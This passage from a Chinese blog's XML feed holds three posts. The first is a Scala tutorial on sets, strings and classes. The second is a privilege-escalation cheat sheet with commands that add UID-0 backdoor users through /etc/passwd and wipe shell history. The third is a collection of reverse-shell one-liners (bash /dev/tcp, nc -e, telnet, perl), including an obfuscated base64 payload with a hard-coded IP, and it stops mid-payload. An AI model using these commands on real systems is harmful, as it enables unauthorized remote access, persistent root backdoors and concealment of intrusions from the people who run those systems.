punctuation">)</span><span class="token keyword">val</span> set <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">val</span> map <span class="token operator">=</span> Map<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">></span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">-</span><span class="token operator">></span><span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token operator">-</span><span class="token operator">></span><span class="token string">"three"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>集合基本操作</em></p><table><thead><tr><th align="center"><strong>方法</strong></th><th align="center"><strong>描述</strong></th></tr></thead><tbody><tr><td align="center">head</td><td align="center">此方法返回列表的第一个元素</td></tr><tr><td align="center">tail</td><td align="center">此方法返回由除第一个之外的所有元素组成的列表</td></tr><tr><td align="center">isEmpty</td><td align="center">如果列表为空，则此方法返回*&nbsp;true&nbsp;<em>，否则返回</em> false&nbsp;*</td></tr></tbody></table><p><em>拼接集合</em><br>可以使用 ++ 运算符或 Set.++() 方法连接两个或多个集合，但是在添加集合时，它将删除重复的元素。</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> fruit1 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token string">"apples"</span><span class="token punctuation">,</span> <span class="token string">"oranges"</span><span class="token punctuation">,</span> <span class="token string">"pears"</span><span class="token punctuation">)</span>      <span class="token keyword">val</span> fruit2 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token string">"mangoes"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// use two or more sets with ++ as operator</span>      <span class="token keyword">var</span> fruit <span class="token operator">=</span> fruit1 <span class="token operator">++</span> fruit2      println<span class="token punctuation">(</span> <span class="token string">"fruit1 ++ fruit2 : "</span> <span class="token operator">+</span> fruit <span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// use two sets with ++ as method</span>      fruit <span class="token operator">=</span> fruit1<span class="token punctuation">.</span>+<span class="token operator">+</span><span class="token punctuation">(</span>fruit2<span class="token punctuation">)</span>      println<span class="token punctuation">(</span> <span class="token string">"fruit1.++(fruit2) : "</span> <span class="token operator">+</span> fruit <span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 运行结果：fruit1 ++ fruit2 : Set(banana, apples, mangoes, pears, oranges)fruit1.++(fruit2) : Set(banana, apples, mangoes, pears, oranges)*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>集合中查找最大值，最小元素</em><br>可以使用 Set.min 方法和 Set.max 方法来分别找出集合中元素的最大值和最小值</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> num <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// find min and max of the elements</span>      println<span class="token punctuation">(</span> <span class="token string">"Min element in Set(5,6,9,20,30,45) : "</span> <span class="token operator">+</span> num<span class="token punctuation">.</span>min <span class="token punctuation">)</span>      println<span class="token punctuation">(</span> <span class="token string">"Max element in Set(5,6,9,20,30,45) : "</span> <span class="token operator">+</span> num<span class="token punctuation">.</span>max <span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 运行结果：Min element in Set(5,6,9,20,30,45) : 5Max element in Set(5,6,9,20,30,45) : 45*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>查找交集值</em><br>可以使用 Set.&amp; 或 Set.intersect 方法来查找两个集合之间的交集(相交值)</p><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> num1 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span>      <span class="token keyword">val</span> num2 <span class="token operator">=</span> Set<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// find common elements between two sets</span>      println<span class="token punctuation">(</span> <span class="token string">"num1.&amp;(num2) : "</span> <span class="token operator">+</span> num1<span class="token punctuation">.</span>&amp;<span class="token punctuation">(</span>num2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      println<span class="token punctuation">(</span> <span class="token string">"num1.intersect(num2) : "</span> <span class="token operator">+</span> num1<span class="token punctuation">.</span>intersect<span class="token punctuation">(</span>num2<span class="token punctuation">)</span> <span class="token punctuation">)</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/* 运行结果num1.&amp;(num2) : Set(20, 9)num1.intersect(num2) : Set(20, 9)*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x08-字符串操作"><a href="#0x08-字符串操作" class="headerlink" title="0x08 字符串操作"></a>0x08 字符串操作</h2><h3 id="1-常用操作"><a href="#1-常用操作" class="headerlink" title="1. 常用操作"></a>1. 常用操作</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">//字符串去重</span><span class="token string">"aabbcc"</span><span class="token punctuation">.</span>distinct <span class="token comment" spellcheck="true">// "abc"</span><span class="token comment" spellcheck="true">//取前n个字符，如果n大于字符串长度返回原字符串</span><span class="token string">"abcd"</span><span class="token punctuation">.</span>take<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "abcd"</span><span class="token comment" spellcheck="true">//字符串排序</span><span class="token string">"bcad"</span><span class="token punctuation">.</span>sorted <span class="token comment" spellcheck="true">// "abcd"</span><span class="token comment" spellcheck="true">//过滤特定字符</span><span class="token string">"bcad"</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>_ <span class="token operator">!=</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// "bcd"</span><span class="token comment" spellcheck="true">//类型转换</span><span class="token string">"true"</span><span class="token punctuation">.</span>toBoolean<span class="token string">"123"</span><span class="token punctuation">.</span>toInt<span class="token string">"123.0"</span><span class="token punctuation">.</span>toDouble<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-原生字符串"><a href="#2-原生字符串" class="headerlink" title="2. 原生字符串"></a>2. <strong>原生字符串</strong></h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">//包含换行的字符串</span><span class="token keyword">val</span> s1<span class="token operator">=</span> <span class="token string">"""Welcome here.   Type "HELP" for help!"""</span><span class="token comment" spellcheck="true">//包含正则表达式的字符串</span><span class="token keyword">val</span> regex <span class="token operator">=</span> <span class="token string">"""\d+"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-字符串插值"><a href="#3-字符串插值" class="headerlink" title="3. 字符串插值"></a>3. 字符串插值</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">val</span> name <span class="token operator">=</span> <span class="token string">"world"</span><span class="token keyword">val</span> msg <span class="token operator">=</span> s<span class="token string">"hello, ${name}"</span> <span class="token comment" spellcheck="true">// hello, world</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x09-类和对象"><a href="#0x09-类和对象" class="headerlink" title="0x09 类和对象"></a>0x09 类和对象</h2><h3 id="1-声明类"><a href="#1-声明类" class="headerlink" title="1. 声明类"></a>1. 声明类</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">class</span> Point<span class="token punctuation">(</span>xc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> yc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">var</span> x<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> xc   <span class="token keyword">var</span> y<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> yc   <span class="token keyword">def</span> move<span class="token punctuation">(</span>dx<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dy<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      x <span class="token operator">=</span> x <span class="token operator">+</span> dx      y <span class="token operator">=</span> y <span class="token operator">+</span> dy      println <span class="token punctuation">(</span><span class="token string">"x 的坐标点: "</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"y 的坐标点: "</span> <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-实例化类"><a href="#2-实例化类" class="headerlink" title="2. 实例化类"></a>2. 实例化类</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">object</span> Test <span class="token punctuation">{</span>   <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">val</span> pt <span class="token operator">=</span> <span class="token keyword">new</span> Point<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 移到一个新的位置</span>      pt<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-继承"><a href="#3-继承" class="headerlink" title="3. 继承"></a>3. 继承</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">class</span> Point<span class="token punctuation">(</span>xc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> yc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">var</span> x<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> xc   <span class="token keyword">var</span> y<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> yc   <span class="token keyword">def</span> move<span class="token punctuation">(</span>dx<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dy<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      x <span class="token operator">=</span> x <span class="token operator">+</span> dx      y <span class="token operator">=</span> y <span class="token operator">+</span> dy      println <span class="token punctuation">(</span><span class="token string">"x 的坐标点: "</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"y 的坐标点: "</span> <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> Location<span class="token punctuation">(</span><span class="token keyword">override</span> <span class="token keyword">val</span> xc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> <span class="token keyword">override</span> <span class="token keyword">val</span> yc<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span>   <span class="token keyword">val</span> zc <span class="token operator">:</span><span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token keyword">extends</span> Point<span class="token punctuation">(</span>xc<span class="token punctuation">,</span> yc<span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">var</span> z<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> zc   <span class="token keyword">def</span> move<span class="token punctuation">(</span>dx<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dy<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> dz<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      x <span class="token operator">=</span> x <span class="token operator">+</span> dx      y <span class="token operator">=</span> y <span class="token operator">+</span> dy      z <span class="token operator">=</span> z <span class="token operator">+</span> dz      println <span class="token punctuation">(</span><span class="token string">"x 的坐标点 : "</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"y 的坐标点 : "</span> <span class="token operator">+</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>      println <span class="token punctuation">(</span><span class="token string">"z 的坐标点 : "</span> <span class="token operator">+</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-重写"><a href="#4-重写" class="headerlink" title="4. 重写"></a>4. 重写</h3><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">class</span> Person <span class="token punctuation">{</span>  <span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">override</span> <span class="token keyword">def</span> toString <span class="token operator">=</span> getClass<span class="token punctuation">.</span>getName <span class="token operator">+</span> <span class="token string">"[name="</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">}</span><span class="token keyword">class</span> Employee <span class="token keyword">extends</span> Person <span class="token punctuation">{</span>  <span class="token keyword">var</span> salary <span class="token operator">=</span> <span class="token number">0.0</span>  <span class="token keyword">override</span> <span class="token keyword">def</span> toString <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span>toString <span class="token operator">+</span> <span class="token string">"[salary="</span> <span class="token operator">+</span> salary <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">}</span><span class="token keyword">object</span> Test <span class="token keyword">extends</span> App <span class="token punctuation">{</span>  <span class="token keyword">val</span> fred <span class="token operator">=</span> <span class="token keyword">new</span> Employee  fred<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Fred"</span>  fred<span class="token punctuation">.</span>salary <span class="token operator">=</span> <span class="token number">50000</span>  println<span class="token punctuation">(</span>fred<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> Scala </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权合集</title>
      <link href="/post/32a72de7.html"/>
      <url>/post/32a72de7.html</url>
      
        <content type="html"><![CDATA[<h1 id="提权合集"><a href="#提权合集" class="headerlink" title="提权合集"></a>提权合集</h1><h3 id="一、提权资源"><a href="#一、提权资源" class="headerlink" title="一、提权资源"></a>一、提权资源</h3><p>Linux-kernel-exploits：<a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br>windows-kernel-exploits：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br>漏洞利用搜索引擎：<a href="https://sploitus.com/">https://sploitus.com/</a><br>Exploit Database：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br>Vulnerability &amp; Exploit Database：<a href="https://www.rapid7.com/db/?type=metasploit">https://www.rapid7.com/db/?type=metasploit</a><br>Har-sia：<a href="https://har-sia.info/index-en.html">https://har-sia.info/index-en.html</a><br>GTFOBins：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="二、提权命令合集"><a href="#二、提权命令合集" class="headerlink" title="二、提权命令合集"></a>二、提权命令合集</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>获取基本信息</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 查看系统发行版本</span>lsb_release -a<span class="token comment" spellcheck="true"># 查看内核版本</span><span class="token function">uname</span> -a<span class="token comment" spellcheck="true"># 查找可以用来提权的SUID文件</span><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null<span class="token comment" spellcheck="true"># 查看计划任务，找到有修改权限的计划任务脚本</span><span class="token function">ls</span> -l /etc/cron*<span class="token function">more</span> /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加普通用户</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 创建一个用户名guest，密码123456的普通用户</span><span class="token function">useradd</span> -p `openssl <span class="token function">passwd</span> -1 -salt <span class="token string">'salt'</span> 123456` guest<span class="token comment" spellcheck="true"># useradd -p 方法  ` ` 是用来存放可执行的系统命令,"$()"也可以存放命令执行语句</span><span class="token function">useradd</span> -p <span class="token string">"<span class="token variable"><span class="token variable">$(</span>openssl <span class="token function">passwd</span> -1 123456<span class="token variable">)</span></span>"</span> guest<span class="token comment" spellcheck="true"># chpasswd方法</span><span class="token function">useradd</span> guest<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'guest:123456'</span><span class="token operator">|</span>chpasswd<span class="token comment" spellcheck="true"># echo -e方法</span><span class="token function">useradd</span> <span class="token function">test</span><span class="token punctuation">;</span><span class="token keyword">echo</span> -e <span class="token string">"123456\n123456\n"</span> <span class="token operator">|</span><span class="token function">passwd</span> <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后把我们添加的用户赋予 <strong>root</strong> 权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"guest:x:0:0::/:/bin/sh"</span> <span class="token operator">>></span> /etc/passwd<span class="token keyword">echo</span> <span class="token string">'guest:123456'</span><span class="token operator">|</span>chpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>直接添加 <strong>root</strong> 用户</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 创建一个用户名guest，密码123456的root用户</span><span class="token function">useradd</span> -p `openssl <span class="token function">passwd</span> -1 -salt <span class="token string">'salt'</span> 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="无痕终端操作"><a href="#无痕终端操作" class="headerlink" title="无痕终端操作"></a>无痕终端操作</h4><p>执行完成后当前终端所有操作不被记录</p><pre class="line-numbers language-bash"><code class="language-bash">unset HISTORY HISTFILE HISTLOG HISTSAVES<span class="token function">export</span> HISTFILE<span class="token operator">=</span>/dev/null<span class="token function">export</span> HISTSIZE<span class="token operator">=</span>0<span class="token function">export</span> HISTFILESIZE<span class="token operator">=</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、Exp-使用三部曲"><a href="#三、Exp-使用三部曲" class="headerlink" title="三、Exp 使用三部曲"></a>三、Exp 使用三部曲</h3><pre class="line-numbers language-bash"><code class="language-bash">gcc exp.c -o expchomd +x exp./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="四、linux-提权辅助工具"><a href="#四、linux-提权辅助工具" class="headerlink" title="四、linux 提权辅助工具"></a>四、linux 提权辅助工具</h3><ol><li>les - 该工具主要帮助检测 linux 内核的安全缺陷</li></ol><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><ol start="2"><li>LinEnum - 提权信息收集</li></ol><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><h3 id="五、Windows-下的权限划分"><a href="#五、Windows-下的权限划分" class="headerlink" title="五、Windows 下的权限划分"></a>五、Windows 下的权限划分</h3><p>Windows 是一个支持多用户、多任务的操作系统，这是权限设置的基础，一切权限设置都是基于用户和进程而言的，不同的用户在访问这台计算机时，将会有不同的权限。<br><strong>WindowsNT 用户组：</strong></p><ul><li><code>Administrators</code>：管理员组，默认情况下，Administrators 中的用户对计算机/域有不受限制的完全访问权。</li><li><code>Power Users</code>：高级用户组，Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。</li><li><code>Users</code>：普通用户组，这个组的用户无法进行有意或无意的改动。</li><li><code>Guests</code>：来宾组，来宾跟普通 Users 的成员有同等访问权，但来宾帐户的限制更多</li><li><code>Everyone</code>：所有的用户，这个计算机上的所有用户都属于这个组。</li></ul><p>​</p><h3 id="六、Linux-下的权限划分"><a href="#六、Linux-下的权限划分" class="headerlink" title="六、Linux 下的权限划分"></a>六、Linux 下的权限划分</h3><p>在 Linux 系统中，用户是分角色的，角色不同，对应权限不同。用户角色通过 UID 和 GID 识别。特别是 UID，一个 UID 是唯一标识一个系统用户的账号。</p><ul><li><code>超级用户（0）</code>：默认是 root 用户，其 UID 和 GID 都是 0。root 用户在每台 Unix 和 Linux 系统中都是唯一且真是存在的，通过它可以登陆系统，操作系统中任何文件执行系统中任何命令，拥有最高管理权限。</li><li><code>普通用户（1~499/1~999）</code>：系统中大多数用户都是普通用户，实际中也一般使用普通用户操作，需要权限是用 sudo 命令提升权限。</li><li><code>虚拟用户（500~65535/1000~65535）</code>：与真实的普通用户区分开来，这类用户最大特点是安装系统后默认就会存在，且默认情况大多数不能登陆系统，其在/etc/passwd 文件中，最后字段为/sbin/nologin。是系统正常运行不可缺少的，主要是方便系统管理，满足相应的系统进程对文件属主的要求</li></ul><p>​</p><h3 id="七、使用-python-快速开启-http-服务器"><a href="#七、使用-python-快速开启-http-服务器" class="headerlink" title="七、使用 python 快速开启 http 服务器"></a>七、使用 python 快速开启 http 服务器</h3><p>在当前目录开启 <strong>http</strong> 服务：</p><ol><li>基于 <strong>python2.x</strong></li></ol><pre><code>python2 -m SimpleHTTPServer 8000</code></pre><ol start="2"><li>基于 <strong>Python3.x</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">python3 -m http.server 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell方式收集</title>
      <link href="/post/50f9aa58.html"/>
      <url>/post/50f9aa58.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-攻击机-nc-监听"><a href="#0x00-攻击机-nc-监听" class="headerlink" title="0x00 攻击机 nc 监听"></a>0x00 攻击机 nc 监听</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -nvlp 443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-n: 不反向解析 dns，即不通过 ip 解析域名 no dns<br>-v: 详细信息输出 verbose<br>-l: 监听 listen<br>-p: 指定端口 port</p><h3 id="0x01-常用-Shell"><a href="#0x01-常用-Shell" class="headerlink" title="0x01 常用 Shell"></a>0x01 常用 Shell</h3><h4 id="1-Linux-Mac-OS"><a href="#1-Linux-Mac-OS" class="headerlink" title="1. Linux/Mac OS"></a>1. Linux/Mac OS</h4><p>查看全部 shell：<em>cat /etc/shells</em></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># sh</span>/bin/sh<span class="token comment" spellcheck="true"># bash</span>/bin/bash/usr/bin/bash<span class="token comment" spellcheck="true"># rbash</span>/bin/rbash/usr/bin/rbash<span class="token comment" spellcheck="true"># dash</span>/bin/dash/usr/bin/dash<span class="token comment" spellcheck="true"># Other</span>/usr/bin/screen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-Windows"><a href="#2-Windows" class="headerlink" title="2. Windows"></a>2. Windows</h4><pre class="line-numbers language-powershell"><code class="language-powershell">cmdpowershell<span class="token comment" spellcheck="true"># shell路径</span>C:<span class="token operator">/</span>Windows<span class="token operator">/</span>System32<span class="token operator">/</span>cmd<span class="token punctuation">.</span>exeC:<span class="token operator">/</span>Windows<span class="token operator">/</span>System32<span class="token operator">/</span>WindowsPowerShell<span class="token operator">/</span>v1<span class="token punctuation">.</span>0<span class="token operator">/</span>powershell<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-各种反弹方式"><a href="#0x02-各种反弹方式" class="headerlink" title="0x02 各种反弹方式"></a>0x02 各种反弹方式</h3><h4 id="1-bash-反弹"><a href="#1-bash-反弹" class="headerlink" title="1. bash 反弹"></a>1. bash 反弹</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/AttackerIp/AttackerPort 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64 版</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">'{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMTU5LjQyLjI0LzgwIDA+JjE=}|{base64,-d}|{bash,-i}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-nc-反弹"><a href="#2-nc-反弹" class="headerlink" title="2. nc 反弹"></a>2. nc 反弹</h4><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/sh AttackerIp AttackerPort<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-e: 指定 nc 连接成功后执行的程序</p><h4 id="3-telnet-反弹-nc-不可用或-dev-tcp-不可用时"><a href="#3-telnet-反弹-nc-不可用或-dev-tcp-不可用时" class="headerlink" title="3. telnet 反弹(nc 不可用或/dev/tcp 不可用时)"></a>3. telnet 反弹(nc 不可用或/dev/tcp 不可用时)</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> backpipe p <span class="token operator">&amp;&amp;</span> telnet attackerip 8080 0<span class="token operator">&lt;</span>backpipe <span class="token operator">|</span> /bin/bash 1<span class="token operator">></span>backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-perl-反弹"><a href="#4-perl-反弹" class="headerlink" title="4. perl 反弹"></a>4. perl 反弹</h4><pre class="line-numbers language-bash"><code class="language-bash">perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="attackerip";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span><span aria-hidden="true" 